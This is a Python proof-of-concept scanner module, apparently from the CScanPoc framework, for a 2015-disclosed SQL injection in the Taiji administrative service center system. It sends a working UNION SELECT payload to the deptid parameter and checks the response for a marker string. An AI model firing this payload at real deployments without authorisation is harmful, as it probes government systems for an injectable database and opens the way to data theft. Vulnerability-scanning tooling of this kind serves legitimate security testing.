# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Taiji_0001'  # 平台漏洞编号，留空
    name = '太极行政服务中心 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-02-27'  # 漏洞公布时间
    desc = '''
        太极行政服务中心是由太极计算机股份有限公司打造的一款为行政部门简化管理的多功能系统。
        太极行政服务中心SQL注入:
        /bmtd.do?method=dept&deptid=00942001
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=085183'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '太极行政服务中心'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7389d8c1-3e09-4f4d-970f-220368fa239c'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            arg = '{target}'.format(target=self.target)
            # proxy = ('1237.0.0.1', 8887)
            url = arg + \
                '/bmtd.do?method=dept&deptid=00942001%27%20union%20select%20CHR(87)||CHR(116)||CHR(70)||CHR(97)||CHR(66)||CHR(99)%20from%20dual--'
            code, head, res, err, _ = hh.http(url)
            if(code == 200) and ('WtFaBc' in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
